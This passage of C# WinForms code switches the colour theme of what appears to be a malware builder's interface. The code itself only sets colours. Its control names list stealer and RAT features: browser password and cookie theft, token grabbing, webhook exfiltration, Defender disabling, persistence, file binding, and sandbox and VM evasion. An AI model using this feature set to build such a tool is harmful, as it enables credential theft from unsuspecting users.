        this.textBox6.ForeColor = Color.DodgerBlue;
        this.textBox1.ForeColor = Color.DodgerBlue;
        this.textBox3.ForeColor = Color.DodgerBlue;
        this.checkBox2.ForeColor = Color.DodgerBlue;
        this.checkBox3.ForeColor = Color.DodgerBlue;
        this.checkBox4.ForeColor = Color.DodgerBlue;
        this.label17.ForeColor = Color.DodgerBlue;
        this.label18.ForeColor = Color.DodgerBlue;
        this.label19.ForeColor = Color.DodgerBlue;
        this.label20.ForeColor = Color.DodgerBlue;
        this.label21.ForeColor = Color.DodgerBlue;
        this.faketitleBox.ForeColor = Color.DodgerBlue;
        this.fakeMessageBox.ForeColor = Color.DodgerBlue;
        this.obfuscateBox.ForeColor = Color.DodgerBlue;
        this.errorBox.ForeColor = Color.DodgerBlue;
        this.startupBox.ForeColor = Color.DodgerBlue;
        this.defenderBox.ForeColor = Color.DodgerBlue;
        this.taskmanagerBox.ForeColor = Color.DodgerBlue;
        this.bsodBox.ForeColor = Color.DodgerBlue;
        this.pluginBox.ForeColor = Color.DodgerBlue;
        this.blockerBox.ForeColor = Color.DodgerBlue;
        this.hidesBox.ForeColor = Color.DodgerBlue;
        this.jumpscareBox.ForeColor = Color.DodgerBlue;
        this.inputdBox.ForeColor = Color.DodgerBlue;
        this.swinkeyBox.ForeColor = Color.DodgerBlue;
        this.sbrpassBox.ForeColor = Color.DodgerBlue;
        this.sbrCookiesBox.ForeColor = Color.DodgerBlue;
        this.sVpnBox.ForeColor = Color.DodgerBlue;
        this.swifiBox.ForeColor = Color.DodgerBlue;
        this.sbrhisBox.ForeColor = Color.DodgerBlue;
        this.dinternetBox.ForeColor = Color.DodgerBlue;
        this.pluginSource.Lexer = Lexer.Cpp;
        this.pluginSource.StyleResetDefault();
        this.pluginSource.Styles[32].Font = "Consolas";
        this.pluginSource.Styles[32].Size = 10;
        this.pluginSource.Styles[32].BackColor = Color.FromArgb(5, 5, 5);
        this.pluginSource.Styles[32].ForeColor = Color.DodgerBlue;
        this.pluginSource.StyleClearAll();
        this.pluginSource.Styles[0].ForeColor = Color.DodgerBlue;
        this.pluginSource.Styles[1].ForeColor = Color.FromArgb(0, 128, 0);
        this.pluginSource.Styles[2].ForeColor = Color.FromArgb(0, 128, 0);
        this.pluginSource.Styles[15].ForeColor = Color.FromArgb(128, 128, 128);
        this.pluginSource.Styles[4].ForeColor = Color.Olive;
        this.pluginSource.Styles[5].ForeColor = Color.Blue;
        this.pluginSource.Styles[16].ForeColor = Color.Blue;
        this.pluginSource.Styles[6].ForeColor = Color.FromArgb(163, 21, 21);
        this.pluginSource.Styles[7].ForeColor = Color.FromArgb(163, 21, 21);
        this.pluginSource.Styles[13].ForeColor = Color.FromArgb(163, 21, 21);
        this.pluginSource.Styles[12].BackColor = Color.Pink;
        this.pluginSource.Styles[10].ForeColor = Color.Purple;
        this.pluginSource.Styles[9].ForeColor = Color.Maroon;
        this.pluginSource.Margins[0].Width = 16;
        this.pluginSource.Styles[33].BackColor = Color.FromArgb(16, 16, 16);
        this.pluginSource.ScrollWidth = 1;
        this.label9.ForeColor = Color.DodgerBlue;
        this.label8.ForeColor = Color.DodgerBlue;
        this.fileinfoLabel.ForeColor = Color.DodgerBlue;
        this.buildingLabel.ForeColor = Color.DodgerBlue;
        this.embedBox.BackColor = Color.DodgerBlue;
        this.webhookCheck.ForeColor = Color.DodgerBlue;
        this.iconUpload.ForeColor = Color.DodgerBlue;
        this.iconUpload.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.iconUpload.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.colorSelect.ForeColor = Color.DodgerBlue;
        this.colorSelect.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.colorSelect.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.generateButton.ForeColor = Color.DodgerBlue;
        this.generateButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.generateButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.cloneButton.ForeColor = Color.DodgerBlue;
        this.cloneButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.cloneButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.buildButton.ForeColor = Color.DodgerBlue;
        this.label14.ForeColor = Color.DodgerBlue;
        this.label10.ForeColor = Color.DodgerBlue;
        this.label11.ForeColor = Color.DodgerBlue;
        this.label12.ForeColor = Color.DodgerBlue;
        this.label13.ForeColor = Color.DodgerBlue;
        this.label15.ForeColor = Color.DodgerBlue;
        this.label16.ForeColor = Color.DodgerBlue;
        this.dAIObox.ForeColor = Color.DodgerBlue;
        this.nameBox.ForeColor = Color.DodgerBlue;
        this.ipBox.ForeColor = Color.DodgerBlue;
        this.macBox.ForeColor = Color.DodgerBlue;
        this.tokenBox.ForeColor = Color.DodgerBlue;
        this.winBox.ForeColor = Color.DodgerBlue;
        this.exportCredentials.ForeColor = Color.DodgerBlue;
        this.exportCredentials.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.exportCredentials.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.dAIOupload.ForeColor = Color.DodgerBlue;
        this.dAIOupload.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.dAIOupload.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.label28.ForeColor = Color.DodgerBlue;
        this.pumpBox.ForeColor = Color.DodgerBlue;
        this.pumpPathBox.ForeColor = Color.DodgerBlue;
        this.label22.ForeColor = Color.DodgerBlue;
        this.label29.ForeColor = Color.DodgerBlue;
        this.miscWebhookBox.ForeColor = Color.DodgerBlue;
        this.TokenCheckerBox.ForeColor = Color.DodgerBlue;
        this.label23.ForeColor = Color.DodgerBlue;
        this.label24.ForeColor = Color.DodgerBlue;
        this.userBox.ForeColor = Color.DodgerBlue;
        this.textBox2.ForeColor = Color.DodgerBlue;
        this.label27.ForeColor = Color.DodgerBlue;
        this.flooderEmbed.BackColor = Color.DodgerBlue;
        this.safeBox.ForeColor = Color.DodgerBlue;
        this.label26.ForeColor = Color.DodgerBlue;
        this.label25.ForeColor = Color.DodgerBlue;
        this.label36.ForeColor = Color.DodgerBlue;
        this.label30.ForeColor = Color.DodgerBlue;
        this.label31.ForeColor = Color.DodgerBlue;
        this.label32.ForeColor = Color.DodgerBlue;
        this.label33.ForeColor = Color.DodgerBlue;
        this.label34.ForeColor = Color.DodgerBlue;
        this.label35.ForeColor = Color.DodgerBlue;
        this.tNameLabel.ForeColor = Color.DodgerBlue;
        this.tEmailLabel.ForeColor = Color.DodgerBlue;
        this.tPhoneLabel.ForeColor = Color.DodgerBlue;
        this.tIDLabel.ForeColor = Color.DodgerBlue;
        this.tMFALabel.ForeColor = Color.DodgerBlue;
        this.tVLabel.ForeColor = Color.DodgerBlue;
        this.kbBox.ForeColor = Color.DodgerBlue;
        this.mbBox.ForeColor = Color.DodgerBlue;
        this.gbBox.ForeColor = Color.DodgerBlue;
        this.pumpButton.ForeColor = Color.DodgerBlue;
        this.pumpButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.pumpButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.button4.ForeColor = Color.DodgerBlue;
        this.button4.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.button4.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.tokenChecker.ForeColor = Color.DodgerBlue;
        this.tokenChecker.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.tokenChecker.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.flooderEmSelect.ForeColor = Color.DodgerBlue;
        this.flooderEmSelect.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.flooderEmSelect.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.button6.ForeColor = Color.DodgerBlue;
        this.button5.ForeColor = Color.DodgerBlue;
        this.wdeleteButton.ForeColor = Color.DodgerBlue;
        this.wdeleteButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.wdeleteButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.button8.ForeColor = Color.DodgerBlue;
        this.button8.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.button8.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.ratButton.ForeColor = Color.DodgerBlue;
        this.ratBox.ForeColor = Color.DodgerBlue;
        this.pipBox.ForeColor = Color.DodgerBlue;
        this.label44.ForeColor = Color.DodgerBlue;
        this.rURLBox.ForeColor = Color.DodgerBlue;
        this.label42.ForeColor = Color.DodgerBlue;
        this.label40.ForeColor = Color.DodgerBlue;
        this.ratTokenBox.ForeColor = Color.DodgerBlue;
        this.label43.ForeColor = Color.DodgerBlue;
        this.label45.ForeColor = Color.DodgerBlue;
        this.label41.ForeColor = Color.DodgerBlue;
        this.ratInstallButton.ForeColor = Color.DodgerBlue;
        this.ratInstallButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.ratInstallButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.insertButton.ForeColor = Color.DodgerBlue;
        this.insertButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.insertButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.ratCompileButton.ForeColor = Color.DodgerBlue;
        this.ratCompileButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.ratCompileButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.saveButton.ForeColor = Color.DodgerBlue;
        this.saveButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.saveButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.nitroBox.ForeColor = Color.DodgerBlue;
        this.cmdBox.ForeColor = Color.DodgerBlue;
        this.page1.ForeColor = Color.DodgerBlue;
        this.page2.ForeColor = Color.DodgerBlue;
        this.label47.ForeColor = Color.DodgerBlue;
        this.fixButton.ForeColor = Color.DodgerBlue;
        this.qrButton.ForeColor = Color.DodgerBlue;
        this.label50.ForeColor = Color.DodgerBlue;
        this.label46.ForeColor = Color.DodgerBlue;
        this.label51.ForeColor = Color.DodgerBlue;
        this.qrStartBtn.ForeColor = Color.DodgerBlue;
        this.qrStartBtn.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.qrStartBtn.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.button7.ForeColor = Color.DodgerBlue;
        this.button7.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.button7.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.btnInventory.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.btnDashboard.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.btnSettings.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.btnWork.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.btnParty.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.btnMap.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.ratButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.qrButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.shYes.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.shYes.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.shNo.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.shNo.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.btnUpdates.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.btnUpdates.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.fixButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.fixButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.englishButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.englishButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.russianButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.russianButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.frenchButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.frenchButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.polishButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.polishButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.spanishButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.spanishButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.turkishButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.turkishButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.germanButton.ForeColor = Color.DodgerBlue;
        this.germanButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.germanButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.arabicButton.ForeColor = Color.DodgerBlue;
        this.arabicButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.arabicButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.binderButton.ForeColor = Color.DodgerBlue;
        this.binderButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.binderButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.button11.ForeColor = Color.DodgerBlue;
        this.button11.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.button11.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.button9.ForeColor = Color.DodgerBlue;
        this.button9.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.button9.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.button10.ForeColor = Color.DodgerBlue;
        this.button10.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.button10.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.button12.ForeColor = Color.DodgerBlue;
        this.button12.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.button12.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.button13.ForeColor = Color.DodgerBlue;
        this.button13.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.button13.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.wizardBox.ForeColor = Color.DodgerBlue;
        this.desBox.ForeColor = Color.DodgerBlue;
        this.label55.ForeColor = Color.DodgerBlue;
        this.label48.ForeColor = Color.DodgerBlue;
        this.label49.ForeColor = Color.DodgerBlue;
        this.label58.ForeColor = Color.DodgerBlue;
        this.label59.ForeColor = Color.DodgerBlue;
        this.label64.ForeColor = Color.DodgerBlue;
        this.fakesButton.ForeColor = Color.DodgerBlue;
        this.fakesButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.fakesButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.backButton.ForeColor = Color.DodgerBlue;
        this.backButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
        this.backButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
        this.label69.ForeColor = Color.DodgerBlue;
        this.sniffersBox.ForeColor = Color.DodgerBlue;
        this.debugBox.ForeColor = Color.DodgerBlue;
        this.vmBox.ForeColor = Color.DodgerBlue;
        this.sandboxBox.ForeColor = Color.DodgerBlue;
        this.emuBox.ForeColor = Color.DodgerBlue;
    }

    private void button3_Click(object sender, EventArgs e)
    {
        this.button1.FlatAppearance.BorderSize = 0;
        this.button2.FlatAppearance.BorderSize = 0;
        this.redButton.FlatAppearance.BorderSize = 0;
        this.button3.FlatAppearance.BorderSize = 1;
        this.cButton = "white";
        if (this.translateLabel.Text != "null")
        {
            this.translateLabel.ForeColor = Color.Gainsboro;
        }
        if (this.checkingLabel.Text != "null")
        {
            this.checkingLabel.ForeColor = Color.Gainsboro;
        }
        this.usernameLabel.ForeColor = Color.Gainsboro;
        this.versionLabel.ForeColor = Color.Gainsboro;
        this.pnlNav.BackColor = Color.Gainsboro;
        this.btnDashboard.ForeColor = Color.Gainsboro;
        this.btnInventory.ForeColor = Color.Gainsboro;
        this.btnWork.ForeColor = Color.Gainsboro;
        this.btnMap.ForeColor = Color.Gainsboro;
        this.btnParty.ForeColor = Color.Gainsboro;
        this.btnSettings.ForeColor = Color.Gainsboro;
        this.label1.ForeColor = Color.Gainsboro;
        this.label2.ForeColor = Color.Gainsboro;
        this.label3.ForeColor = Color.Gainsboro;
        this.label4.ForeColor = Color.Gainsboro;
        this.label5.ForeColor = Color.Gainsboro;
        this.label6.ForeColor = Color.Gainsboro;
        this.label7.ForeColor = Color.Gainsboro;
        this.shYes.ForeColor = Color.Gainsboro;
        this.shNo.ForeColor = Color.Gainsboro;
        this.btnUpdates.ForeColor = Color.Gainsboro;
        this.webhookBox.ForeColor = Color.Gainsboro;
        this.englishButton.ForeColor = Color.Gainsboro;
        this.russianButton.ForeColor = Color.Gainsboro;
        this.frenchButton.ForeColor = Color.Gainsboro;
        this.polishButton.ForeColor = Color.Gainsboro;
        this.turkishButton.ForeColor = Color.Gainsboro;
        this.spanishButton.ForeColor = Color.Gainsboro;
        this.label57.ForeColor = Color.Gainsboro;
        this.label54.ForeColor = Color.Gainsboro;
        this.label53.ForeColor = Color.Gainsboro;
        this.label37.ForeColor = Color.Gainsboro;
        this.label52.ForeColor = Color.Gainsboro;
        this.textBox6.ForeColor = Color.Gainsboro;
        this.textBox1.ForeColor = Color.Gainsboro;
        this.textBox3.ForeColor = Color.Gainsboro;
        this.checkBox2.ForeColor = Color.Gainsboro;
        this.checkBox3.ForeColor = Color.Gainsboro;
        this.checkBox4.ForeColor = Color.Gainsboro;
        this.label17.ForeColor = Color.Gainsboro;
        this.label18.ForeColor = Color.Gainsboro;
        this.label19.ForeColor = Color.Gainsboro;
        this.label20.ForeColor = Color.Gainsboro;
        this.label21.ForeColor = Color.Gainsboro;
        this.faketitleBox.ForeColor = Color.Gainsboro;
        this.fakeMessageBox.ForeColor = Color.Gainsboro;
        this.obfuscateBox.ForeColor = Color.Gainsboro;
        this.errorBox.ForeColor = Color.Gainsboro;
        this.startupBox.ForeColor = Color.Gainsboro;
        this.defenderBox.ForeColor = Color.Gainsboro;
        this.taskmanagerBox.ForeColor = Color.Gainsboro;
        this.bsodBox.ForeColor = Color.Gainsboro;
        this.pluginBox.ForeColor = Color.Gainsboro;
        this.blockerBox.ForeColor = Color.Gainsboro;
        this.hidesBox.ForeColor = Color.Gainsboro;
        this.jumpscareBox.ForeColor = Color.Gainsboro;
        this.inputdBox.ForeColor = Color.Gainsboro;
        this.swinkeyBox.ForeColor = Color.Gainsboro;
        this.sbrpassBox.ForeColor = Color.Gainsboro;
        this.sbrCookiesBox.ForeColor = Color.Gainsboro;
        this.sVpnBox.ForeColor = Color.Gainsboro;
        this.swifiBox.ForeColor = Color.Gainsboro;
        this.sbrhisBox.ForeColor = Color.Gainsboro;
        this.dinternetBox.ForeColor = Color.Gainsboro;
        this.pluginSource.Lexer = Lexer.Cpp;
        this.pluginSource.StyleResetDefault();
        this.pluginSource.Styles[32].Font = "Consolas";
        this.pluginSource.Styles[32].Size = 10;
        this.pluginSource.Styles[32].BackColor = Color.FromArgb(5, 5, 5);
        this.pluginSource.Styles[32].ForeColor = Color.Gainsboro;
        this.pluginSource.StyleClearAll();
        this.pluginSource.Styles[0].ForeColor = Color.Gainsboro;
        this.pluginSource.Styles[1].ForeColor = Color.FromArgb(0, 128, 0);
        this.pluginSource.Styles[2].ForeColor = Color.FromArgb(0, 128, 0);
        this.pluginSource.Styles[15].ForeColor = Color.FromArgb(128, 128, 128);
        this.pluginSource.Styles[4].ForeColor = Color.Olive;
        this.pluginSource.Styles[5].ForeColor = Color.Blue;
        this.pluginSource.Styles[16].ForeColor = Color.Blue;
        this.pluginSource.Styles[6].ForeColor = Color.FromArgb(163, 21, 21);
        this.pluginSource.Styles[7].ForeColor = Color.FromArgb(163, 21, 21);
        this.pluginSource.Styles[13].ForeColor = Color.FromArgb(163, 21, 21);
        this.pluginSource.Styles[12].BackColor = Color.Pink;
        this.pluginSource.Styles[10].ForeColor = Color.Purple;
        this.pluginSource.Styles[9].ForeColor = Color.Maroon;
        this.pluginSource.Margins[0].Width = 16;
        this.pluginSource.Styles[33].BackColor = Color.FromArgb(16, 16, 16);
        this.pluginSource.ScrollWidth = 1;
        this.label9.ForeColor = Color.Gainsboro;
        this.label8.ForeColor = Color.Gainsboro;
        this.fileinfoLabel.ForeColor = Color.Gainsboro;
        this.buildingLabel.ForeColor = Color.Gainsboro;
        this.embedBox.BackColor = Color.Gainsboro;
        this.webhookCheck.ForeColor = Color.Gainsboro;
        this.iconUpload.ForeColor = Color.Gainsboro;
        this.iconUpload.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.iconUpload.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.colorSelect.ForeColor = Color.Gainsboro;
        this.colorSelect.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.colorSelect.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.generateButton.ForeColor = Color.Gainsboro;
        this.generateButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.generateButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.cloneButton.ForeColor = Color.Gainsboro;
        this.cloneButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.cloneButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.buildButton.ForeColor = Color.Gainsboro;
        this.label14.ForeColor = Color.Gainsboro;
        this.label10.ForeColor = Color.Gainsboro;
        this.label11.ForeColor = Color.Gainsboro;
        this.label12.ForeColor = Color.Gainsboro;
        this.label13.ForeColor = Color.Gainsboro;
        this.label15.ForeColor = Color.Gainsboro;
        this.label16.ForeColor = Color.Gainsboro;
        this.dAIObox.ForeColor = Color.Gainsboro;
        this.nameBox.ForeColor = Color.Gainsboro;
        this.ipBox.ForeColor = Color.Gainsboro;
        this.macBox.ForeColor = Color.Gainsboro;
        this.tokenBox.ForeColor = Color.Gainsboro;
        this.winBox.ForeColor = Color.Gainsboro;
        this.exportCredentials.ForeColor = Color.Gainsboro;
        this.exportCredentials.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.exportCredentials.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.dAIOupload.ForeColor = Color.Gainsboro;
        this.dAIOupload.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.dAIOupload.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.label28.ForeColor = Color.Gainsboro;
        this.pumpBox.ForeColor = Color.Gainsboro;
        this.pumpPathBox.ForeColor = Color.Gainsboro;
        this.label22.ForeColor = Color.Gainsboro;
        this.label29.ForeColor = Color.Gainsboro;
        this.miscWebhookBox.ForeColor = Color.Gainsboro;
        this.TokenCheckerBox.ForeColor = Color.Gainsboro;
        this.label23.ForeColor = Color.Gainsboro;
        this.label24.ForeColor = Color.Gainsboro;
        this.userBox.ForeColor = Color.Gainsboro;
        this.textBox2.ForeColor = Color.Gainsboro;
        this.label27.ForeColor = Color.Gainsboro;
        this.flooderEmbed.BackColor = Color.Gainsboro;
        this.safeBox.ForeColor = Color.Gainsboro;
        this.label26.ForeColor = Color.Gainsboro;
        this.label25.ForeColor = Color.Gainsboro;
        this.label36.ForeColor = Color.Gainsboro;
        this.label30.ForeColor = Color.Gainsboro;
        this.label31.ForeColor = Color.Gainsboro;
        this.label32.ForeColor = Color.Gainsboro;
        this.label33.ForeColor = Color.Gainsboro;
        this.label34.ForeColor = Color.Gainsboro;
        this.label35.ForeColor = Color.Gainsboro;
        this.tNameLabel.ForeColor = Color.Gainsboro;
        this.tEmailLabel.ForeColor = Color.Gainsboro;
        this.tPhoneLabel.ForeColor = Color.Gainsboro;
        this.tIDLabel.ForeColor = Color.Gainsboro;
        this.tMFALabel.ForeColor = Color.Gainsboro;
        this.tVLabel.ForeColor = Color.Gainsboro;
        this.kbBox.ForeColor = Color.Gainsboro;
        this.mbBox.ForeColor = Color.Gainsboro;
        this.gbBox.ForeColor = Color.Gainsboro;
        this.pumpButton.ForeColor = Color.Gainsboro;
        this.pumpButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.pumpButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.button4.ForeColor = Color.Gainsboro;
        this.button4.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.button4.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.tokenChecker.ForeColor = Color.Gainsboro;
        this.tokenChecker.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.tokenChecker.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.flooderEmSelect.ForeColor = Color.Gainsboro;
        this.flooderEmSelect.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.flooderEmSelect.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.button6.ForeColor = Color.Gainsboro;
        this.button5.ForeColor = Color.Gainsboro;
        this.wdeleteButton.ForeColor = Color.Gainsboro;
        this.wdeleteButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.wdeleteButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.button8.ForeColor = Color.Gainsboro;
        this.button8.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.button8.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.ratButton.ForeColor = Color.Gainsboro;
        this.ratBox.ForeColor = Color.Gainsboro;
        this.pipBox.ForeColor = Color.Gainsboro;
        this.label44.ForeColor = Color.Gainsboro;
        this.rURLBox.ForeColor = Color.Gainsboro;
        this.label42.ForeColor = Color.Gainsboro;
        this.label40.ForeColor = Color.Gainsboro;
        this.ratTokenBox.ForeColor = Color.Gainsboro;
        this.label43.ForeColor = Color.Gainsboro;
        this.label45.ForeColor = Color.Gainsboro;
        this.label41.ForeColor = Color.Gainsboro;
        this.ratInstallButton.ForeColor = Color.Gainsboro;
        this.ratInstallButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.ratInstallButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.insertButton.ForeColor = Color.Gainsboro;
        this.insertButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.insertButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.ratCompileButton.ForeColor = Color.Gainsboro;
        this.ratCompileButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.ratCompileButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.saveButton.ForeColor = Color.Gainsboro;
        this.saveButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.saveButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.nitroBox.ForeColor = Color.Gainsboro;
        this.cmdBox.ForeColor = Color.Gainsboro;
        this.page1.ForeColor = Color.Gainsboro;
        this.page2.ForeColor = Color.Gainsboro;
        this.label47.ForeColor = Color.Gainsboro;
        this.fixButton.ForeColor = Color.Gainsboro;
        this.qrButton.ForeColor = Color.Gainsboro;
        this.label50.ForeColor = Color.Gainsboro;
        this.label46.ForeColor = Color.Gainsboro;
        this.label51.ForeColor = Color.Gainsboro;
        this.qrStartBtn.ForeColor = Color.Gainsboro;
        this.qrStartBtn.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.qrStartBtn.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.button7.ForeColor = Color.Gainsboro;
        this.button7.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.button7.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
        this.btnInventory.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.btnDashboard.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.btnSettings.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.btnWork.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.btnParty.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
        this.btnMap.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
